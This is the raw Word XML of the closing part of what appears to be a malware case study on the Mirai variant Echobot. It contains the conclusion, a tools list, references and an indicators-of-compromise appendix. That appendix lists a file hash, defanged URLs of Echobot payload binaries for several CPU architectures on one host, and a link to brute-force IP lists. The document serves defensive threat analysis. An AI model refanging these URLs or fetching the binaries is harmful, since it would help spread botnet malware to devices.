    <w:p w14:paraId="52F0BE53" w14:textId="5FEF13CB" w:rsidR="00342E9E" w:rsidRDefault="00187E65" w:rsidP="00122E7F">
      <w:r>
        <w:t xml:space="preserve">We believe that the IoT Malware development scene will only continue to evolve and may become a larger problem </w:t>
      </w:r>
      <w:r w:rsidR="00470902">
        <w:t xml:space="preserve">in the future </w:t>
      </w:r>
      <w:r w:rsidR="00342E9E">
        <w:t xml:space="preserve">when the potential of </w:t>
      </w:r>
      <w:r w:rsidR="00C629F8">
        <w:t>IoT</w:t>
      </w:r>
      <w:r w:rsidR="00342E9E">
        <w:t xml:space="preserve"> attacks become more realized.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43B82894" w14:textId="6CE23912" w:rsidR="00187E65" w:rsidRDefault="00342E9E" w:rsidP="00122E7F">
      <w:r>
        <w:t xml:space="preserve">Thanks for reading! </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DB458FB" w14:textId="77777777" w:rsidR="001975FE" w:rsidRPr="00122E7F" w:rsidRDefault="001975FE" w:rsidP="00122E7F"/>
    <w:p w14:paraId="41DEBF48" w14:textId="40BDE412" w:rsidR="00BE0373" w:rsidRDefault="005B393F" w:rsidP="00BE0373">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="13" w:name="_Toc101284341"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>A</w:t>
      </w:r>
      <w:r w:rsidR="00BE0373">
        <w:t>ppendix</w:t>
      </w:r>
      <w:bookmarkEnd w:id="13"/>
    </w:p>
    <w:p w14:paraId="201ED943" w14:textId="6D6273BE" w:rsidR="00BE0373" w:rsidRDefault="00BE0373" w:rsidP="00BE0373">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="14" w:name="_Toc101284342"/>
      <w:r w:rsidRPr="00BE0373">
        <w:t>Indicators Of Compromise</w:t>
      </w:r>
      <w:bookmarkEnd w:id="14"/>
    </w:p>
    <w:p w14:paraId="542856EF" w14:textId="218044BD" w:rsidR="00E3057A" w:rsidRDefault="005A1D32" w:rsidP="00E00714">
      <w:r>
        <w:t>A following list of IP addresses that were used in the Echobot botnet</w:t>
      </w:r>
      <w:r w:rsidR="007822A9">
        <w:t xml:space="preserve"> which we captured in wireshark</w:t>
      </w:r>
      <w:r w:rsidR="00177213">
        <w:t xml:space="preserve"> are listed </w:t>
      </w:r>
      <w:r w:rsidR="007822A9">
        <w:t>in the link below</w:t>
      </w:r>
      <w:r w:rsidR="00177213">
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidR="007822A9">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId26" w:history="1">
        <w:r w:rsidR="0074392C" w:rsidRPr="005244CC">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://github.com/Adumbrati0n/Mirai-Case-Study/blob/main/IPHostBruteForce.txt</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="0074392C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00177213">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EF9D1FB" w14:textId="77777777" w:rsidR="0006557B" w:rsidRDefault="0006557B" w:rsidP="0006557B">
      <w:r>
        <w:t xml:space="preserve">Hashes: </w:t>
      </w:r>
      <w:r w:rsidRPr="00762276">
        <w:t>78b5d0f5d10792b1d816227015a9296b</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A98D6EF" w14:textId="77777777" w:rsidR="00001764" w:rsidRDefault="0006557B" w:rsidP="00E00714">
      <w:r>
        <w:t xml:space="preserve">URLS: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F84B3C5" w14:textId="29C0BC4E" w:rsidR="00001764" w:rsidRDefault="00001764" w:rsidP="00E00714">
      <w:r>
        <w:t>http://</w:t>
      </w:r>
      <w:r w:rsidR="0006557B">
        <w:t>80</w:t>
      </w:r>
      <w:r w:rsidR="009D2701">
        <w:t>[</w:t>
      </w:r>
      <w:r w:rsidR="0006557B">
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="009D2701">
        <w:t>]</w:t>
      </w:r>
      <w:r w:rsidR="0006557B">
        <w:t>82</w:t>
      </w:r>
      <w:r w:rsidR="009D2701">
        <w:t>[</w:t>
      </w:r>
      <w:r w:rsidR="0006557B">
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="009D2701">
        <w:t>]</w:t>
      </w:r>
      <w:r w:rsidR="0006557B">
        <w:t>67</w:t>
      </w:r>
      <w:r w:rsidR="009D2701">
        <w:t>[</w:t>
      </w:r>
      <w:r w:rsidR="0006557B">
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="009D2701">
        <w:t>]</w:t>
      </w:r>
      <w:r w:rsidR="0006557B">
        <w:t>184</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50D9DC61" w14:textId="4F69EE64" w:rsidR="0006557B" w:rsidRDefault="00001764" w:rsidP="00E00714">
      <w:r>
        <w:t>http://80</w:t>
      </w:r>
      <w:r w:rsidR="009D2701">
        <w:t>[.]</w:t>
      </w:r>
      <w:r>
        <w:t>82</w:t>
      </w:r>
      <w:r w:rsidR="009D2701">
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="009D2701">
        <w:t>]</w:t>
      </w:r>
      <w:r>
        <w:t>67</w:t>
      </w:r>
      <w:r w:rsidR="009D2701">
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="009D2701">
        <w:t>]</w:t>
      </w:r>
      <w:r>
        <w:t>184/ECHOBOT.arm6</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D171A7B" w14:textId="026F4162" w:rsidR="00001764" w:rsidRDefault="00001764" w:rsidP="00E00714">
      <w:r w:rsidRPr="00001764">
        <w:t>http://80</w:t>
      </w:r>
      <w:r w:rsidR="009D2701">
        <w:t>[</w:t>
      </w:r>
      <w:r w:rsidRPr="00001764">
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="009D2701">
        <w:t>]</w:t>
      </w:r>
      <w:r w:rsidRPr="00001764">
        <w:t>82</w:t>
      </w:r>
      <w:r w:rsidR="009D2701">
        <w:t>[</w:t>
      </w:r>
      <w:r w:rsidRPr="00001764">
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="009D2701">
        <w:t>]</w:t>
      </w:r>
      <w:r w:rsidRPr="00001764">
        <w:t>67</w:t>
      </w:r>
      <w:r w:rsidR="009D2701">
        <w:t>[</w:t>
      </w:r>
      <w:r w:rsidRPr="00001764">
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="009D2701">
        <w:t>]</w:t>
      </w:r>
      <w:r w:rsidRPr="00001764">
        <w:t>184/ECHOBOT.mips</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E4A1D15" w14:textId="6323186F" w:rsidR="00001764" w:rsidRDefault="00001764" w:rsidP="00E00714">
      <w:r w:rsidRPr="00001764">
        <w:t>http://80</w:t>
      </w:r>
      <w:r w:rsidR="009D2701">
        <w:t>[</w:t>
      </w:r>
      <w:r w:rsidRPr="00001764">
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="009D2701">
        <w:t>]</w:t>
      </w:r>
      <w:r w:rsidRPr="00001764">
        <w:t>82</w:t>
      </w:r>
      <w:r w:rsidR="009D2701">
        <w:t>[</w:t>
      </w:r>
      <w:r w:rsidRPr="00001764">
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="009D2701">
        <w:t>]</w:t>
      </w:r>
      <w:r w:rsidRPr="00001764">
        <w:t>67</w:t>
      </w:r>
      <w:r w:rsidR="009D2701">
        <w:t>[</w:t>
      </w:r>
      <w:r w:rsidRPr="00001764">
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="009D2701">
        <w:t>]</w:t>
      </w:r>
      <w:r w:rsidRPr="00001764">
        <w:t>184/ECHOBOT.x86</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3464CDDC" w14:textId="2C1C5C61" w:rsidR="00001764" w:rsidRDefault="009D2701" w:rsidP="00E00714">
      <w:r w:rsidRPr="009D2701">
        <w:t>http://80</w:t>
      </w:r>
      <w:r>
        <w:t>[</w:t>
      </w:r>
      <w:r w:rsidRPr="009D2701">
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t>]</w:t>
      </w:r>
      <w:r w:rsidRPr="009D2701">
        <w:t>82</w:t>
      </w:r>
      <w:r>
        <w:t>[</w:t>
      </w:r>
      <w:r w:rsidRPr="009D2701">
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t>]</w:t>
      </w:r>
      <w:r w:rsidRPr="009D2701">
        <w:t>67</w:t>
      </w:r>
      <w:r>
        <w:t>[</w:t>
      </w:r>
      <w:r w:rsidRPr="009D2701">
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t>]</w:t>
      </w:r>
      <w:r w:rsidRPr="009D2701">
        <w:t>184/richard</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="731EE849" w14:textId="472B51ED" w:rsidR="00B71F94" w:rsidRDefault="00B71F94" w:rsidP="00B71F94">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="15" w:name="_Toc101284343"/>
      <w:r>
        <w:t>Tools used</w:t>
      </w:r>
      <w:bookmarkEnd w:id="15"/>
    </w:p>
    <w:p w14:paraId="4D2F9EF7" w14:textId="634ED9D2" w:rsidR="00421C49" w:rsidRDefault="00B71F94" w:rsidP="00B71F94">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="47"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Ghidra</w:t>
      </w:r>
      <w:r w:rsidR="00BA5271">
        <w:t xml:space="preserve"> - </w:t>
      </w:r>
      <w:hyperlink r:id="rId27" w:history="1">
        <w:r w:rsidR="00BA5271" w:rsidRPr="005244CC">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://ghidra-sre.org/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00BA5271">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="301AF533" w14:textId="1AD31713" w:rsidR="00421C49" w:rsidRDefault="00421C49" w:rsidP="00B71F94">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="47"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>B</w:t>
      </w:r>
      <w:r w:rsidR="00B71F94">
        <w:t>inutils</w:t>
      </w:r>
      <w:r w:rsidR="00BA5271">
        <w:t xml:space="preserve"> - </w:t>
      </w:r>
      <w:hyperlink r:id="rId28" w:history="1">
        <w:r w:rsidR="00BA5271" w:rsidRPr="005244CC">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://www.gnu.org/software/binutils/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00BA5271">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="104DAEA7" w14:textId="1BD4B954" w:rsidR="00421C49" w:rsidRDefault="00421C49" w:rsidP="00B71F94">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="47"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>S</w:t>
      </w:r>
      <w:r w:rsidR="00B71F94">
        <w:t>trace</w:t>
      </w:r>
      <w:r w:rsidR="00BA5271">
        <w:t xml:space="preserve"> - </w:t>
      </w:r>
      <w:hyperlink r:id="rId29" w:history="1">
        <w:r w:rsidR="00BA5271" w:rsidRPr="005244CC">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://strace.io/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00BA5271">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38613255" w14:textId="7EEA5CAE" w:rsidR="00421C49" w:rsidRDefault="00421C49" w:rsidP="00B71F94">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="47"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Z</w:t>
      </w:r>
      <w:r w:rsidR="00B71F94">
        <w:t>elos</w:t>
      </w:r>
      <w:r w:rsidR="00BC25E9">
        <w:t xml:space="preserve"> - </w:t>
      </w:r>
      <w:hyperlink r:id="rId30" w:history="1">
        <w:r w:rsidR="00BC25E9" w:rsidRPr="005244CC">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://github.com/zeropointdynamics/zelos</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00BC25E9">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="257FC51B" w14:textId="6F2EC36E" w:rsidR="00421C49" w:rsidRDefault="00421C49" w:rsidP="00B71F94">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="47"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>W</w:t>
      </w:r>
      <w:r w:rsidR="00B71F94">
        <w:t>ireshark</w:t>
      </w:r>
      <w:r w:rsidR="00BC25E9">
        <w:t xml:space="preserve"> - </w:t>
      </w:r>
      <w:hyperlink r:id="rId31" w:history="1">
        <w:r w:rsidR="00BC25E9" w:rsidRPr="005244CC">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://www.wireshark.org/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00BC25E9">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B911F6B" w14:textId="257BBEED" w:rsidR="00B71F94" w:rsidRDefault="00421C49" w:rsidP="00B71F94">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="47"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Docker/Qemu/BuildRoot2 – Dynamic Analyzer</w:t>
      </w:r>
      <w:r w:rsidR="00EC40AE">
        <w:t xml:space="preserve"> - </w:t>
      </w:r>
      <w:hyperlink r:id="rId32" w:history="1">
        <w:r w:rsidR="00EC40AE" w:rsidRPr="005244CC">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://github.com/alrawi/badthings-tools/tree/master/dynamic_analysis</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00EC40AE">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0979BD05" w14:textId="35D19012" w:rsidR="00BE0373" w:rsidRDefault="00BE0373" w:rsidP="00BE0373">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="16" w:name="_Toc101284344"/>
      <w:r w:rsidRPr="00BE0373">
        <w:t>References</w:t>
      </w:r>
      <w:bookmarkEnd w:id="16"/>
    </w:p>
    <w:p w14:paraId="6F2B8868" w14:textId="2D35EF60" w:rsidR="004C5F2E" w:rsidRDefault="00000000" w:rsidP="007B3210">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="48"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId33" w:history="1">
        <w:r w:rsidR="004C5F2E" w:rsidRPr="00866B97">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://unit42.paloaltonetworks.com/mirai-variant-echobot-resurfaces-with-13-previously-unexploited-vulnerabilities/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="004C5F2E">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="092D09CC" w14:textId="6476E187" w:rsidR="00313EA6" w:rsidRDefault="00000000" w:rsidP="007B3210">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="48"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId34" w:history="1">
        <w:r w:rsidR="00313EA6" w:rsidRPr="00162736">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://www.radware.com/getattachment/402db7f3-0467-4fa3-bb9a-ae88b728e91b/MiraiHandbookEbookFinal_04.pdf.aspx</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00313EA6">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DFD85D9" w14:textId="38E63D8D" w:rsidR="004C5F2E" w:rsidRDefault="00000000" w:rsidP="007B3210">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="48"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId35" w:history="1">
        <w:r w:rsidR="004C5F2E" w:rsidRPr="00866B97">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://www.bleepingcomputer.com/news/security/new-echobot-variant-exploits-77-remote-code-execution-flaws/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="004C5F2E">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CF74FA1" w14:textId="2C501FE9" w:rsidR="003C4DFC" w:rsidRDefault="00000000" w:rsidP="007B3210">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="48"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId36" w:history="1">
        <w:r w:rsidR="003C4DFC" w:rsidRPr="00162736">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://pastebin.com/raw/JWKpuKid</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="003C4DFC">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18E4EE9C" w14:textId="2F4BDD4B" w:rsidR="00390FA3" w:rsidRDefault="00000000" w:rsidP="007B3210">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="48"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId37" w:history="1">
        <w:r w:rsidR="00390FA3" w:rsidRPr="00162736">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://linuxhint.com/linux-kernel-watchdog-explained/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00390FA3">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59723993" w14:textId="77777777" w:rsidR="00F10D6C" w:rsidRDefault="00000000" w:rsidP="007B3210">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="48"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId38" w:history="1">
        <w:r w:rsidR="00F10D6C" w:rsidRPr="00162736">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://attack.mitre.org</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00F10D6C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C754FFB" w14:textId="23513B5A" w:rsidR="00F10D6C" w:rsidRDefault="00000000" w:rsidP="007B3210">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="48"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId39" w:anchor="home" w:history="1">
        <w:r w:rsidR="00F10D6C" w:rsidRPr="00162736">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://badthings.info/#home</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00F10D6C">
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="498E987F" w14:textId="4C937C79" w:rsidR="00DB2C7F" w:rsidRDefault="00000000" w:rsidP="00A27BE8">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="48"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId40" w:history="1">
        <w:r w:rsidR="00DB2C7F" w:rsidRPr="003B5BC6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://github.com/pan-unit42/iocs/blob/master/mirai/ECHOBOT_28thOct2019.md</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00DB2C7F">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="511AFD75" w14:textId="6013FA10" w:rsidR="00AD0846" w:rsidRDefault="00000000" w:rsidP="00A27BE8">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="48"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId41" w:history="1">
        <w:r w:rsidR="00AD0846" w:rsidRPr="007A0E30">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://github.com/threatland/TL-BOTS/tree/master/TL.MIRAI</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00AD0846">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="796D20B5" w14:textId="2458EB0B" w:rsidR="00C81885" w:rsidRDefault="00000000" w:rsidP="00A27BE8">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="48"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId42" w:history="1">
        <w:r w:rsidR="00C81885" w:rsidRPr="009B5BEA">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://blog.malwaremustdie.org/2016/08/mmd-0056-2016-linuxmirai-just.html</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00C81885">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B836F3F" w14:textId="2B042305" w:rsidR="006E677F" w:rsidRPr="00DB2C7F" w:rsidRDefault="006E677F" w:rsidP="006430ED">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:sectPr w:rsidR="006E677F" w:rsidRPr="00DB2C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C6276" w14:textId="77777777" w:rsidR="00CF235F" w:rsidRDefault="00CF235F" w:rsidP="004F41C2">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="45161AC0" w14:textId="77777777" w:rsidR="00CF235F" w:rsidRDefault="00CF235F" w:rsidP="004F41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788329"/>
      <w:docPartObj>
        <w:docPartGallery w:val="Page Numbers (Bottom of Page)"/>
        <w:docPartUnique/>
      </w:docPartObj>
    </w:sdtPr>
    <w:sdtContent>
      <w:p w14:paraId="6ED21F62" w14:textId="5581B59D" w:rsidR="004F41C2" w:rsidRDefault="004F41C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8DC4C0" w14:textId="77777777" w:rsidR="004F41C2" w:rsidRDefault="004F4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6E2BD" w14:textId="77777777" w:rsidR="00CF235F" w:rsidRDefault="00CF235F" w:rsidP="004F41C2">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="08C4D18E" w14:textId="77777777" w:rsidR="00CF235F" w:rsidRDefault="00CF235F" w:rsidP="004F41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850F6"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="AFC00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7532D8"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="AB50BFC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06A22A50"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="08FE4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6F1FA6"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="A8B0D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0E700A79"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="E9D07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0E906668"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="D3169B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D2A06C4"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="829E4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A36397"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="BE2C0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59216A"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="3120F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5C156C"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="0484B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87314C"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="E9423D7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15:restartNumberingAfterBreak="0">
    <w:nsid w:val="2B5C22DD"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="696A7826"/>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2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3B113942"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="8CD40BA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0" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="3D6765DB"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="41ACC2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D9E0D9D"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="BFE41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3054CC3"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="4036CE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982392D"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="49A012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A892AA8"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="520025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7" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="4FA00306"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="6606705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15:restartNumberingAfterBreak="0">
    <w:nsid w:val="54CD7CA8"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="06F2D1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292446A"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="8D101F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63F274B5"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="2932B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6132346"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="E708B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F235197"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="867E1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76473E"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="CD2ED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D481682"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="6DD2AF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E042A75"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="10282A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30985406">
    <w:abstractNumId w:val="39"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="506944889">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="1584535125">
    <w:abstractNumId w:val="11"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="711537015">
    <w:abstractNumId w:val="44"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="943152120">
    <w:abstractNumId w:val="19"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="538128718">
    <w:abstractNumId w:val="28"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="176580549">
    <w:abstractNumId w:val="34"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="1089623179">
    <w:abstractNumId w:val="9"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="817527294">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="10" w16cid:durableId="1763185756">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="11" w16cid:durableId="241523888">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="12" w16cid:durableId="1078869510">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="13" w16cid:durableId="2025133651">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="14" w16cid:durableId="2074311673">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="15" w16cid:durableId="1737124143">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="16" w16cid:durableId="2067024145">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="17" w16cid:durableId="154272299">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="18" w16cid:durableId="1448423497">
    <w:abstractNumId w:val="24"/>
  </w:num>
